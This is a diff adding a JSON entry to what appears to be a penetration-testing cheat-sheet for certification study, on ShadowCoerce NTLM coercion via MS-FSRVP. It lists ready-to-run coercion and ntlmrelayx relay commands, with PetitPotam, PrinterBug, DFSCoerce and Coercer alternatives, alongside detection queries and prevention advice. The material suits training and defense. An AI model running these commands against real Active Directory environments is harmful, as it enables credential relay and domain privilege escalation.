@@ -1,0 +1,99 @@
+{
+  "id": "ad-shadowcoerce",
+  "name": "ShadowCoerce - NTLM Authentication Coercion via MS-FSRVP",
+  "command": "python3 shadowcoerce.py -d <domain> -u <user> -p <password> <listener_ip> <dc_ip>",
+  "description": "ShadowCoerce abuses the MS-FSRVP (File Server VSS Agent Service) protocol to coerce NTLM authentication from a target machine. Similar to PetitPotam but uses a different RPC interface. Feed the coerced auth into ntlmrelayx for RBCD, Shadow Credentials, or ADCS relay.",
+  "platform": "linux",
+  "type": "command",
+  "opsec": "moderate",
+  "category": "Active Directory",
+  "subcategory": "Lateral Movement",
+  "certifications": [
+    "CRTP",
+    "CPTS"
+  ],
+  "primary_cert": "CPTS",
+  "source": "ShutdownRepo/ShadowCoerce; coercion research",
+  "tags": [
+    "shadowcoerce",
+    "ms-fsrvp",
+    "ntlm-coercion",
+    "relay",
+    "authentication-coercion"
+  ],
+  "mitre": [
+    "T1187"
+  ],
+  "exam": "exam-ok",
+  "notes": "=== THE IDEA ===\nMS-FSRVP (File Server VSS Agent Service) can be abused to\nmake a target machine authenticate to an attacker-controlled\nhost. Like PetitPotam, but uses a different RPC pipe.\n\n=== USAGE ===\n  python3 shadowcoerce.py -d corp.local -u user -p pass <listener_ip> <dc_ip>\n\n=== CHAIN WITH NTLMRELAYX ===\n  # Terminal 1: Start relay\n  ntlmrelayx.py -t ldaps://<dc_ip> --delegate-access --escalate-user attacker$\n  # Terminal 2: Coerce\n  python3 shadowcoerce.py -d corp.local -u user -p pass <attacker_ip> <target_ip>\n\n=== ALTERNATIVES (if MS-FSRVP is disabled) ===\n  # PetitPotam (MS-EFSR)\n  python3 PetitPotam.py <listener_ip> <dc_ip>\n  # PrinterBug (MS-RPRN)\n  python3 printerbug.py corp.local/user:pass@<dc_ip> <listener_ip>\n  # DFSCoerce (MS-DFSNM)\n  python3 dfscoerce.py -d corp.local -u user -p pass <listener_ip> <dc_ip>\n  # Coercer (tries all methods)\n  coercer coerce -l <listener_ip> -t <dc_ip> -u user -p pass",
+  "examples": [
+    {
+      "label": "Coerce NTLM auth via MS-FSRVP",
+      "command": "python3 shadowcoerce.py -d corp.local -u user -p pass 10.10.14.5 192.168.1.10"
+    },
+    {
+      "label": "Chain with ntlmrelayx for RBCD",
+      "command": "ntlmrelayx.py -t ldaps://192.168.1.10 --delegate-access"
+    },
+    {
+      "label": "Coercer multi-method",
+      "command": "coercer coerce -l 10.10.14.5 -t 192.168.1.10 -u user -p pass -d corp.local"
+    }
+  ],
+  "references": [
+    {
+      "title": "ShadowCoerce - GitHub",
+      "url": "https://github.com/ShutdownRepo/ShadowCoerce"
+    },
+    {
+      "title": "Coercer - Multi-method",
+      "url": "https://github.com/p0dalirius/Coercer"
+    }
+  ],
+  "recommended": [
+    {
+      "id": "ad-petitpotam",
+      "note": "PetitPotam uses MS-EFSR for the same coercion attack.",
+      "rel": "alternative"
+    },
+    {
+      "id": "ad-printerbug-enum",
+      "note": "PrinterBug uses MS-RPRN for coercion.",
+      "rel": "alternative"
+    }
+  ],
+  "defense": {
+    "why_it_works": "MS-FSRVP is a Windows RPC service that can be invoked remotely. The IsPathSupported call forces the target to authenticate back to the caller, leaking the machine NTLM hash.",
+    "prerequisites": "Valid domain credentials; MS-FSRVP service running on target.",
+    "impact": "Coerced machine account NTLM hash for relay attacks leading to RBCD, Shadow Credentials, or ADCS abuse.",
+    "detection": "[MITRE T1187] RPC calls to MS-FSRVP from unusual sources; NTLM authentication to unexpected hosts.",
+    "artifacts": "Network traffic on FssagentRpc named pipe; NTLM authentication to non-DC hosts.",
+    "splunk_spl": "index=wineventlog EventCode=5145 ShareName=\"IPC$\" RelativeTargetName=\"FssagentRpc\"\n| table _time, SubjectUserName, IpAddress",
+    "elastic_kql": "event.code:\"5145\" AND winlog.event_data.ShareName:\"IPC$\" AND winlog.event_data.RelativeTargetName:\"FssagentRpc\"",
+    "sentinel_kql": "SecurityEvent\n| where EventID == 5145\n| where ShareName == \"IPC$\" and RelativeTargetName == \"FssagentRpc\"\n| project TimeGenerated, SubjectUserName, IpAddress",
+    "sigma_rules": "win_shadow_coerce_fsrvp_access",
+    "prevention": "Disable MS-FSRVP service if not needed; enforce LDAP signing and channel binding.",
+    "sources": [
+      "https://github.com/ShutdownRepo/ShadowCoerce",
+      "https://attack.mitre.org/techniques/T1187/"
+    ],
+    "detections": [
+      {
+        "platform": "sentinel",
+        "name": "ShadowCoerce - MS-FSRVP pipe access",
+        "logic": "SecurityEvent\n| where EventID == 5145\n| where ShareName == \"IPC$\" and RelativeTargetName == \"FssagentRpc\"\n| project TimeGenerated, SubjectUserName, IpAddress, AccessMask",
+        "data_source": "windows-security",
+        "log_ids": [
+          "5145"
+        ],
+        "attack": [
+          "T1187"
+        ],
+        "fidelity": "signature",
+        "confidence": "high",
+        "false_positives": "Legitimate File Server VSS Agent operations during backup windows",
+        "tuning": "Correlate with NTLM relay indicators (Event 4624 type 3 from unexpected sources)"
+      }
+    ]
+  }
+}
